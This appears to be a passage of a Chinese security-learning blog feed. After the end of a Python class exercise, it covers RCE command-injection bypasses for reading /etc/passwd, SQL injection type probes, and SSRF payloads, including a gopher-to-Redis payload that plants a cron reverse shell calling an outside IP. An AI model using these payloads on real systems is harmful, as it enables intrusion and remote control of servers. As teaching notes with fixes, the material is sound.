class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line">    e.age = age</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的信息为Employee类创建一个实例e，调用hasattr方法检验实例有没有属性age，如果存在属性age直接调用printclass输出，否则使用setattr函数为其添加属性age，并设置值为输入后，再调用printclass输出。<br><strong>输入描述：</strong><br>三行分别依次输入姓名name、工资salary、年龄age，其中第一行为字符串，后两行为整型数字。<br><strong>输出描述：</strong><br>第一行输出e有没有属性age，True或者False；<br>第二行输出printclass打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>4000<br>23<br><strong>输出：</strong><br>False<br>NiuNiu’s salary is 4000, and his age is 23<br>题目来源：牛客网</li>
</ol>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">input</span>()</span><br><span class="line">age = <span class="built_in">input</span>()</span><br><span class="line">e = Employee(name, salary)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">print</span>(<span class="built_in">hasattr</span>(e, <span class="string">&#x27;age&#x27;</span>)):</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">setattr</span>(e,<span class="string">&quot;age&quot;</span>,age)</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>面向对象编程参考习题：<br><a href="https://www.cnblogs.com/plf-Jack/p/11054248.html#:~:text=python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%B9%8B%E7%BB%83%E4%B9%A0%E9%A2%981%201%20%E5%AE%9A%E4%B9%89%E7%AE%A1%E7%90%86%E5%91%98%E7%B1%BB%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%AD%A6%E6%A0%A1%E3%80%81%E5%88%9B%E5%BB%BA%E8%AF%BE%E7%A8%8B%E3%80%81%E5%88%9B%E5%BB%BA%E8%80%81%E5%B8%88%202%20%E5%AE%9A%E4%B9%89%E8%80%81%E5%B8%88%E7%B1%BB%EF%BC%8C%E8%80%81%E5%B8%88%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%E3%80%81%E7%BB%99%E5%AD%A6%E7%94%9F%E6%89%93%E5%88%86%2C%E4%BD%86%E5%8F%91%E7%8E%B0%E5%AD%A6%E7%94%9F%E6%B2%A1%E6%9C%89%E8%B4%AD%E4%B9%B0%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E4%B8%8D%E8%83%BD%E6%89%93%E5%88%86%EF%BC%8C%E5%B9%B6%E7%BB%99%E5%87%BA%E6%8F%90%E7%A4%BA%203,%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E8%AF%BE%E7%A8%8B%EF%BC%8C%E4%BD%86%E5%AD%A6%E6%A0%A1%E6%B2%A1%E6%9C%89%E8%AF%A5%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E7%A4%BA%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%B8%8D%E8%83%BD%E9%80%89%E6%8B%A9%E8%AF%A5%E8%AF%BE%E7%A8%8B%204%20%E5%AE%9A%E4%B9%89%E5%AD%A6%E6%A0%A1%E7%B1%BB%EF%BC%8C%E5%AD%A6%E6%A0%A1%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Caddr%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%205%20%E5%AE%9A%E4%B9%89%E8%AF%BE%E7%A8%8B%E7%B1%BB%EF%BC%8C%E8%AF%BE%E7%A8%8B%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E5%AD%A6%E7%94%9F%20">python面向对象之练习题1</a><br><a href="https://blog.csdn.net/qq_44034384/article/details/107600403">Python面向对象练习题汇总</a></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>就写到这里了，虽然不算写得很好，但还是有模有样吧<br>希望Python期末能考高分！</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE漏洞</title>
    <url>/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p>
<span id="more"></span>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE（remote command&#x2F;code execute），远程命令&#x2F;代码执行。RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。比如常见的路由器，防火墙，入侵检测等设备的web管理界面上。一般会给用户提供ping操作的web界面。<br>用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交不符合预期的命令，并让后台执行，从而控制整个后台服务器。<br>现在很多企业开始实施自动化运维，大量系统操作会通过“自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行漏洞。远程代码执行 同样的道理，因为需求设计，后台有时也会把用户的输入作为代码的一部分执行，也就造成RCE漏洞。比如代码执行的函数，不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定要对接口输入的内容进行严格判断，比如实施严格的白名单策略会是一个比较好的办法。</p>
<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="代码层过滤不严"><a href="#代码层过滤不严" class="headerlink" title="代码层过滤不严"></a>代码层过滤不严</h2><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：</p>
<pre><code>system(&quot;/bin/program --arg $arg&quot;);
</code></pre>
<h2 id="系统漏洞造成命令注入"><a href="#系统漏洞造成命令注入" class="headerlink" title="系统漏洞造成命令注入"></a>系统漏洞造成命令注入</h2><pre><code>比如：bash破壳漏洞（CVE-2014-6217）
</code></pre>
<h2 id="调用的第三方组件存在代码执行漏洞"><a href="#调用的第三方组件存在代码执行漏洞" class="headerlink" title="调用的第三方组件存在代码执行漏洞"></a>调用的第三方组件存在代码执行漏洞</h2><pre><code>如wordpress中用来处理图片的imageMagick组件
Java中的命令执行漏洞（struts2/ElasticsearchGroovy等）
ThinkPHP5.x的命令执行
</code></pre>
<h1 id="命令执行漏洞的利用条件"><a href="#命令执行漏洞的利用条件" class="headerlink" title="命令执行漏洞的利用条件"></a>命令执行漏洞的利用条件</h1><ol>
<li>开发人员调用了能够执行系统命令的函数</li>
<li>这个函数的参数可控（即用户能够控制）</li>
<li>开发人员没有对该函数的参数进行过滤或过滤不严</li>
</ol>
<h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><h2 id="利用系统函数实现命令执行的函数"><a href="#利用系统函数实现命令执行的函数" class="headerlink" title="利用系统函数实现命令执行的函数"></a>利用系统函数实现命令执行的函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(), assert(), preg_replace(), call_user_func()</span><br></pre></td></tr></table></figure>
<p>如果页面存在以上函数且对用户输入没有作严格过滤，那么可能会造成远程命令执行漏洞，除此之外还有其它函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_start(), unserialize(), creat_function(), uasort(), uksort(), array_filter(), array_reduce()</span><br></pre></td></tr></table></figure>

<h2 id="直接执行系统命令的代码函数"><a href="#直接执行系统命令的代码函数" class="headerlink" title="直接执行系统命令的代码函数"></a>直接执行系统命令的代码函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru(), pcntl_exec(), popen(), proc_open(), 反引号</span><br></pre></td></tr></table></figure>


<h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><p>命令拼接符号可以连接多个命令，恶意命令通常拼接在正常命令后面。</p>
<h2 id="Windows的系统命令拼接符"><a href="#Windows的系统命令拼接符" class="headerlink" title="Windows的系统命令拼接符"></a>Windows的系统命令拼接符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接符 		示例 		解释</span><br><span class="line">&amp; 		A&amp;B 		无论A是false还是true，B都执行。即互不影响</span><br><span class="line">&amp;&amp; 		A&amp;&amp;B 		具有短路效果，A是false，B就不执行</span><br><span class="line">| 		A|B 		表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br><span class="line">|| 		A||B 		表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure>

<h2 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h2><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp;的作用是使命令在后台执行。只要在命令后面跟上一个空格和&amp;，可以一口气在后台运行多个命令。需要停止，就是kill -s 进程号。如下所示：<br><img src="/simg/rce_1.png" alt=" "></p>
<h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>分号（;）作用是进行多条命令的无关联执行，每一条执行结果互不影响，示例如下：<br><img src="/simg/rce_2.png" alt=" "></p>
<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>&amp;&amp;的用法和功能与Windows相同，都是左边成功右边才能执行。</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>||的用法和功能与Windows相同，都是前面执行失败才执行后面。</p>
<h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>如果想执行几条命令，则需要用命令分隔符分号隔开每条命令，并使用圆括号()把所有命令组合起来，示例如下：<br><img src="/simg/rce_3.png" alt=" "></p>
<h2 id="常用命令总述"><a href="#常用命令总述" class="headerlink" title="常用命令总述"></a>常用命令总述</h2><p>使用时不要局限于单个的，简单的用法，因为很多过滤参数的方式都是识别对应的拼接符，所以要思维变通，很多时候，大量拼接符层层嵌套往往会有出其不意的效果<br>    比如上面这个圆括号的使用例子，意思就是当echo 1 执行成功后会执行后面的命令，把echo 1输出到 11.txt ，然后复制11.txt到根目录。 结合||和&amp;&amp;可以实现复杂的功能。</p>
<h1 id="常用绕开防护的方法"><a href="#常用绕开防护的方法" class="headerlink" title="常用绕开防护的方法"></a>常用绕开防护的方法</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
<li>常见通配符如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">符号 	含义</span><br><span class="line">? 		匹配单个字符，匹配多个字符需要多个?连用</span><br><span class="line">* 		*代表任意数量的字符</span><br><span class="line">[] 		代表一定有一个在括号内的字符（非任意字符），例如[abcd]代表一定有一个字符，可能是a,b,c,d这四个中任何一个</span><br></pre></td></tr></table></figure></li>
<li>使用示例：<br>一个常用的读取密码命令如下：<br><code>cat /etc/passwd</code><br>可以搭配多种通配符使用。<br>使用?通配符后，可能会有多种变化，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /?tc/?as?wd</span><br><span class="line">cat /*tc/*as*wd</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><ul>
<li>常见连接符<br><code>单引号（&#39;）双引号（&quot;）反斜杠（\）  如：/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t/&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></li>
<li>使用示例：<br><img src="/simg/rce_4.png" alt=" "></li>
</ul>
<h2 id="未初始化变量"><a href="#未初始化变量" class="headerlink" title="未初始化变量"></a>未初始化变量</h2><ul>
<li>简介<br>未初始化的变量值都是null，例如a,a,a,b，在Linux环境下都输出为null，所以可以用未初始化变量加在一些命令的末尾，来绕过一些黑名单。</li>
<li>使用示例<br><code>cat$a /etc$a/passwd$a</code><br><img src="/simg/rce_5.png" alt=" "></li>
</ul>
<h1 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h1><p>各种cms框架的命令执行漏洞是最多的，着重在这些地方找。除此之外就是插件位置，插件因为各种原因经常也需要执行系统命令。当然其它地方也有。</p>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol>
<li>各种框架、插件等都可能出现命令执行，升级到新版本，多打补丁</li>
<li>关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</li>
<li>少用框架&#x2F;cms</li>
<li>可以过滤一些符号从而减少一些危险</li>
<li>安全配置好php相关参数<br>php配置文件里有个disable_functions的配置，这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数。<br>例如：disable_functions&#x3D;system,passthru,shell_exec,exec,popen便禁止了用这些函数来执行系统命令</li>
<li>升级中间件</li>
<li>严格控制传入变量，严禁使用魔法函数</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大多只是看了，没有实际操作，得加强一下实战方面。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_63844103/article/details/126953630?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&utm_relevant_index=2">命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之字符型和数字型判断</title>
    <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
<span id="more"></span>

<h1 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1 时，两者为true即返回正常<br>当$id &#x3D; 1 and 1&#x3D;2 时，后者为false即返回错误</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>单引号不匹配，因此返回错误<br>（说明：其它形式的符号也是类似情况）</p>
</li>
</ol>
<h1 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1  或 $id &#x3D; 1 and 1&#x3D;2 时，<br>因为有引号包裹，因此均返回正常</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>多余的单引号不匹配，因此返回错误</p>
</li>
</ol>
<p>字符型可以通过闭合多余的单引号，使用注释符#或--+或%23</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure>
<p>最后的引号被注释掉，实际运行效果是id&#x3D;’1’<br>因此返回正常</p>
<h1 id="字符型和数字型"><a href="#字符型和数字型" class="headerlink" title="字符型和数字型"></a>字符型和数字型</h1><p>通过以上分析，我们可以得出结论：</p>
<ul>
<li>当$id&#x3D;1 and 1&#x3D;2 时，<br>数字型返回错误，而字符型返回正常</li>
<li>当$id&#x3D;1’ 时，<br>二者均返回错误</li>
<li>当$id&#x3D;1’--+ 时，<br>数字型返回错误，而字符型返回正常</li>
</ul>
<p>注：or可以构造一个一直为true的语句，能返回正常。常用于万能密码</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>字符型</tag>
        <tag>数字型</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务端请求伪造</title>
    <url>/2022/12/09/SSRF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF与CSRF有一些相似之处，也有很大区别。</p>
<span id="more"></span>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br><img src="/simg/ssrf_1.png" alt=" "><br><img src="/simg/ssrf_2.png" alt=" "></p>
<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
<h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>了解了漏洞的原理后，我们知道所有能发起请求的地方都可能会存在SSRF漏洞，我们可以根据“漏洞代码”中的常见方法对项目进行自查。以下列举一些最容易出现本漏洞的场景：</p>
<ol>
<li>能填写链接的地方</li>
</ol>
<ul>
<li>业务场景</li>
<li>从URL上传图片</li>
<li>订阅RSS</li>
<li>爬虫</li>
<li>预览</li>
<li>离线下载</li>
</ul>
<ol start="2">
<li>数据库内置功能</li>
</ol>
<ul>
<li>Oracle</li>
<li>MongoDB</li>
<li>MSSQL</li>
<li>Postgres</li>
<li>CouchDB</li>
</ul>
<ol start="3">
<li>邮箱服务器收取其他邮箱邮件</li>
</ol>
<ul>
<li>POP3&#x2F;IMAP&#x2F;SMTP</li>
</ul>
<ol start="4">
<li>文件处理、编码处理、属性处理</li>
</ol>
<ul>
<li>FFmpeg</li>
<li>ImageMagick</li>
<li>Docx</li>
<li>PDF</li>
<li>XML</li>
</ul>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。<br>主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作。</p>
<ul>
<li>访问正常文件<br>访问正常文件，例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li>
<li>端口扫描<br>当访问未开放端口，脚本会显示空白或报错。例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
当访问开放端口时，脚本会显示banner信息：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br></pre></td></tr></table></figure></li>
<li>读取系统本地文件<br>利用file协议可以任意读取系统本地文件，提交参数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file://c:windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li>
<li>内网web应用指纹识别<br>识别内网应用使用的框架，平台，模块以及cms可以为后续的渗透测试提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜索漏洞进行攻击。<br>比如可以通过访问下列文件来判断phpMyAdmin是否安装以及详细版本：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://localhost/phpmyadmin/README</span><br></pre></td></tr></table></figure></li>
<li>攻击内网应用<br>内网的安全通常都很薄弱，溢出、弱口令等一般都是存在的。通过ssrf攻击，可以实现对内网的访问，从而可以攻击内网应用或本地机器，获得shell，这里的应用包括服务、web应用等。<br>仅仅通过get方法可以攻击的web应用有很多，比如struts2命令执行等。<br>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>file_get_contents这一函数是把传入的参数(变量)写入字符串，当把 传参是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述测试代码中，file_get_contents()函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似于ssrf.php?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的payload即可读取服务器本地的任意文件。<br><img src="/simg/ssrf_3.png" alt=" "><br>readfile()函数与file_get_contents()函数相似。</p>
<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code><br>hostname: 如果安装了 OpenSSL，那么可以在主机名地址前面添加 ssl:&#x2F;&#x2F; 或者是 tls:&#x2F;&#x2F;，从而可以使用基于 TCP&#x2F;IP 协议的 SSL 或者 TLS 的客户端连接到远程主机。<br>port: 端口号。可以省略该参数或传 -1，则表示传输器不使用端口，例如 unix:&#x2F;&#x2F;。<br>errno: 如果errno的返回值为0，而且这个函数的返回值为FALSE，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。<br>errstr: 错误信息将以字符串的信息返回。<br>timeout: 设置连接的时限，单位为秒。fsockopen()的连接时限（timeout）的参数仅仅在套接字连接的时候生效。</p>
<p>用于打开一个网络连接或一个unix套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其它文件类函数调用（如：fgets(),fgetss(),fwrite(),fclose()还有feof()）。如果调用失败，将会返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">	<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_4.png" alt=" "></p>
